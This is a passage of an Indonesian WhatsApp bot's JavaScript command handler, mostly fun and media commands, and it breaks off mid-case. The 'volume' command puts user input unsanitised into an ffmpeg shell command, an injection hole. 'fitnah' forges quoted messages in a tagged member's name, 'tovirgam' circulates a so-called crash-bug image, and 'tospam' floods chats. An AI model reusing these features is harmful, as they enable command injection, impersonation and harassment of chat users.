					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
					break
					
case 'gaycek':
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
					break
					
case 'lesbicek':
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bo = lesbi[Math.floor(Math.random() * lesbi.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bo+'%', text, { quoted: dev })
					break
					
case 'gantengcek':
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
					break
					
case 'cantikcek':
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
					break
					
case 'watak':
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: dev })
					break
				
case 'hobby':
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: dev })
					break
					case 'babi':
 if(!isGroup) return setReply("Hanya bisa di group")
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bua = pushname[Math.floor(Math.random() * mge.length)]
              teks = `Yang Paling Babi Disini Adalah : @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
        if(!isGroup) return setReply("Hanya bisa di group")
              membr = []
              const ngewe = groupMembers
              
              const beb = ngewe[Math.floor(Math.random() * ngewe.length)]
              
              teks = `Yang Paling Beban Disini Adalah : @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break


           
           
           
           
           
           
           
           
           
           
           
           
       case 'tovirgam':
       case 'jadivirgam':
        if (!isOwner) return onlyOwner()
					if (!isQuotedSticker) return setReply('Reply stiker nya')
					if (isQuotedSticker){
						const encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await xdev.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return setReply(mess.error.api)
							buffer = fs.readFileSync(ran)
							xdev.sendMessage(from, buffer, image, {quoted: dev, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
           
           
           
           case 'out':
           case 'leave':
				if (!isGroup) return 
				        if (!isOwner) return onlyOwner()
				    if (!isOwner && autosticker) return sendSticker(gaboleh)
				xdev.groupLeave(from)
						break
						
						
						
						case 'reportbug':
						case 'bugreport':
						case 'laporbug':
						if(!q) return setReply(`Masukan laporan bug dengan teks atau reply gambar screenshot dengan teks\nLaporan yang main-main tidak akan di tanggapi`)
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						if(!q) return setReply("Masukan laporan bug yang di alami")
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage(`6285156137901@s.whatsapp.net`, buff, image, { caption: `*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n` })
							await xdev.modifyChat(`6285156137901@s.whatsapp.net`, ChatModification.delete)
							await xdev.sendMessage(from,"Laporan bug telah dikirim",text)
					    } else {
							await xdev.sendMessage(`6285156137901@s.whatsapp.net`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n`,text)
						    await xdev.modifyChat(`6285156137901@s.whatsapp.net`, ChatModification.delete)
						    await xdev.sendMessage(from,"Laporan bug telah dikirim",text)
					        }
					       break
						
						
						
						
						
						
						
						case 'tts':	
						try{
						if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (args.length < 1) return setReply('Kode bahasanya mana kak?')
					if (args.length < 2) return setReply('Textnya mana kak?')
					const gtts = require('./lib/gtts')(args[0])
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? setReply('Textnya kebanyakan kak')
					: gtts.save(ranm, dtt, function() {
						xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})   } catch (err){
						console.log(err)
            	setReply("Aduh gagal, coba lgi dong ^_^")
   
            }
					limitAdd(senderNumber, user)
					break
						
						
				
						
           
           
           
           
           
           



           
           
           
           
           
          
           
           
				
					
		
					
					
		
			 
					
					
					
case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (!isQuotedAudio) return setReply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await xdev.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return setReply('Error!')
jadie = fs.readFileSync(rname)
xdev.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: setQuoted})
fs.unlinkSync(rname)
}
)
break
					
					
                 
                 
                 
           
           case 'ocr': 
				    if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
						const yamampun = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
						const media = await xdev.downloadAndSaveMediaMessage(yamampun)
						setReply('wait')
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								setReply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								setReply(err)
								fs.unlinkSync(media)
							})
					} else {
						setReply(`kirim gambar bertulisan english dengan caption ${prefix + command}`)
					}
					break

           
           case 'clear':
               if (!isOwner) return onlyOwner()
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)                
                break
           
           case 'delchat':
               if (!isOwner) return onlyOwner()
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)
                setTimeout( () => {
                xdev.sendMessage(from, aw, text)
                },3000)
                break
           
           case 'closetime': 
				if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Close time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, true);
					setReply(close)
				}, timer)
				break
				
				
case 'opentime':        
			if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
               if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Open time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const open = {
					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, false);
					setReply(open)
				}, timer)
				break
				
				
				
case 'nuliskiri':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}nuliskiri* teks`)
                setReply(mess.wait)                
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkiri.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                    '-size','960x1280',
                    '-pointsize','22',
                    '-interline-spacing','2',
                    '-annotate','+140+153',
                    fixHeight,'./temp/nulis/images/buku/setelahkiri.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
           break
                
                case 'nuliskanan':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}nuliskanan* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkanan.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                     '-size', '960x1280',
                    '-pointsize','23',
                    '-interline-spacing','2',
                    '-annotate','+128+129',
                    fixHeight, './temp/nulis/images/buku/setelahkanan.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
             break
            case 'foliokiri':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}foliokiri* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                     '-pointsize',
'55',
                     '-interline-spacing',
'2',
                     '-annotate',
'+80+390',
                    fixHeight,
'./temp/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
                break
                
            case 'foliokanan':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}foliokanan* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkanan.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                    '-pointsize',
'55',
                    '-interline-spacing',
'2',
                    '-annotate',
'+130+400',
                    fixHeight,
'./temp/nulis/images/folio/setelahkanan.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
                break
                
                
                
                
                
                
                
                
                
                
                

       
            
          case 'getfp':
         case 'getpp':
				if (isGroup) { 
				if(q) return setReply("Jangan di tag")
				 if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
				setReply(mess.wait)
			     kicknya = dev.message.extendedTextMessage.contextInfo.participant
			     try {
                 pic = await xdev.getProfilePicture(kicknya)
                 } catch {
                pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                onichan = await getBuffer(pic)
				xdev.sendMessage(from, onichan, image, {quoted: setQuoted})
                } else {
                setReply(mess.wait)
                linkpp = await xdev.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                buffer = await getBuffer(linkpp)
               xdev.sendMessage(from, buffer, image, {caption: "Nih", quoted: dev })
               }     
               break
            
            
            
               
            case 'getbio':
            if(isGroup){
         if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
	  setReply(mess.wait)
	  var yy = dev.message.extendedTextMessage.contextInfo.participant
var p = await xdev.getStatus(`${yy}`, MessageType.text)
setReply(p.status)
} else{
setReply(mess.wait)
var a = await xdev.getStatus(from, MessageType.text)
setReply(a.status)
}
break
           
           
           
           
           


           
           

           
           
case 'tospam':
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return setReply('Kebanyakan!')
if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await xdev.downloadAndSaveMediaMessage(encmedian)
				ara = fs.readFileSync(median)
	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  sendSticker(ara)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await xdev.downloadAndSaveMediaMessage(encmediat)
				ara = fs.readFileSync(mediat)
	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, ara, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
	delb = await xdev.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return setReply('Kebanyakan!')
	if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
           
           
           
           
           
           
           
           
           
           
           
    case 'delvote':
            if(!dev.key.remoteJid) return
            if(isVote) return setReply('Tidak ada sesi Voting')
            delVote(from)
            setReply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !dev.key.fromMe) return 
            if(!isGroup) return setReply(mess.only.group)
            if(!q) return setReply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (isVote) return setReply('Sesi Voting Sedang Berlangsung Di Grup Ini')            
            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return setReply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `ketik vote untuk setuju \nketik devote untuk tidak setuju\n-Huruf kecil semua\n\nvote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
            
            

    
    
    
    
    
    
    
    case 'caripesan':
            if(!q)return setReply('pesannya apa bang?')
            let v = await xdev.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            setReply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await xdev.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            setReply('Pesan tidak ditemukan!')
            }           
            break
            


    

				
				
    
     




case 'darkjokes':
setReply(mess.wait)
try{
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					await xdev.sendMessage(from, hasil, image, {quoted: setQuoted, caption: '*GELAP BOS :V*'})
					} catch (err){
						setReply(err)
						}
				break
    
    
    case 'on': 
             if (!isOwner) return onlyOwner()
            offline = false
            setReply(' ANDA TELAH ONLINE')
            break       
    case 'statuson':
            setReply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${publik ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!isOwner) return onlyOwner()
            if(!q) return reply ("Alasanya apa kak ?")
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            setReply(`Anda telah offline dengan alasan ${q}`)
            break   
    case 'get':
            if(!q) return setReply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            setReply(bu)
            })   
            break
     



case 'google':
              if (!q) return setReply('masukan teks')
              if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
               ggs = require('google-it')
              ggs({ 'query': q }).then(results => {
              vars =``
              vars += `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
               xdev.sendMessage(from, lama, text, {quoted : dev })
               })
               break


					
					
					case 'setnamebot':
					case 'setbotname':
					if (!isOwner) return onlyOwner()
					setReply(`Berhasil mengubah nama bot ke ${q}`)
					fake = `${q}`
					break
					
					case 'forwardtotal':
					case 'totalforward':
					if(forwarding === false) return setReply("Aktifkan fitur forward")
					if (!isOwner) return onlyOwner()
					if(!q) return setReply(`Jumlah forwardnya berapa kak\ncontoh : 1, 100, 1000, 100000`)
					setReply(`Berhasil mengubah total forward ke ${q}`)
					totalForward = `${q}`
					break
					
					
					
					



			       
		     





                    
                


     





    case 'kontag':
        if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return setReply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${PhoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    
    case 'fitnah':
    try{
    if(!isGroup) return setReply("Hanya bisa di group tod")
    if(!q) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
           // if (args.length < 2) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join(" ")
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            xdev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            } catch (err){
            	setReply(`Error ngab, penggunaan :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            }
            break
    
            
    case 'tomp3':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
    case 'fast':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':  
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
            case 'hode':
  if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
					medok = await xdev.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: dev})
						fs.unlinkSync(ran)
					})
				break
            
            case 'ghost':
if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mele = await xdev.downloadAndSaveMediaMessage(encmedia2)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(mele)
					if (err) return setReply('Error!')
					buffer453 = fs.readFileSync(ran)
					xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
                    fs.unlinkSync(ran)
				    })
		            break



case 'nightcore':
if(!isQuotedAudio) return setReply('Reply audionya')
setReply(mess.wait)
					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mela = await xdev.downloadAndSaveMediaMessage(encmedia4)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mela)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					   })
				       break



case 'tupai':
if(!isQuotedAudio) return setReply('Reply audionya')
				setReply(mess.wait)
					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					medoi = await xdev.downloadAndSaveMediaMessage(mesi)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medoi)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					})
				break





case 'imut':
if(!isQuotedAudio) return setReply('Reply audionya')
setReply(mess.wait)
	 ahu = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
	masa = await xdev.downloadAndSaveMediaMessage(ahu)
	ran = getRandom('.mp3')
